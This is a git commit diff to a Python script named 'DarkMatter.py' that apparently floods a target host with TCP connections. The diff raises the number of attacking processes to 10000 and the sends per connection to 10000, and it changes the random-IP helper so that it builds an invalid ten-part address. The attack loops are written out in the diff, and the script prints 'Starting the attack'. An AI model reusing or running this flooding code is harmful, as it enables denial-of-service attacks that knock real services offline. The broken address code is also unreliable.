3be6e1b7103e6e15e033454a2fc2752efb600f05
toancute2k0 <nhaozocom284@gmail.com>
2021-10-19 09:14:51 +0700

    update

--- DarkMatter.py
+++ DarkMatter.py
@@ -15,13 +15,25 @@ def randomip():
   randip2 = random.randint(1,255)
   randip3 = random.randint(1,255)
   randip4 = random.randint(1,255)
-  
+  randip5 = random.randint(1,255)
+  randip6 = random.randint(1,255)
+  randip7 = random.randint(1,255)
+  randip8 = random.randint(1,255)
+  randip9 = random.randint(1,255)
+  randip10 = random.randint(1,255)
+
   randip.append(randip1)
   randip.append(randip2)
   randip.append(randip3)
   randip.append(randip4)
+  randip.append(randip5)
+  randip.append(randip6)
+  randip.append(randip7)
+  randip.append(randip8)
+  randip.append(randip9)
+  randip.append(randip10)
 
-  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5]) + "." + str(randip[6]) + "." + str(randip[7]) + "." + str(randip[8]) + "." + str(randip[9])
   return(randip)
 
 print("[>>>] Starting the attack [<<<]")
@@ -41,7 +53,7 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(100):
+      for y in range(10000):
           atk.send(str.encode(request))
     except socket.error:
       time.sleep(.1)
@@ -50,7 +62,7 @@ def attack():
 
 
 def send2attack():
-  for i in range(5000): #Magic Power
+  for i in range(10000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
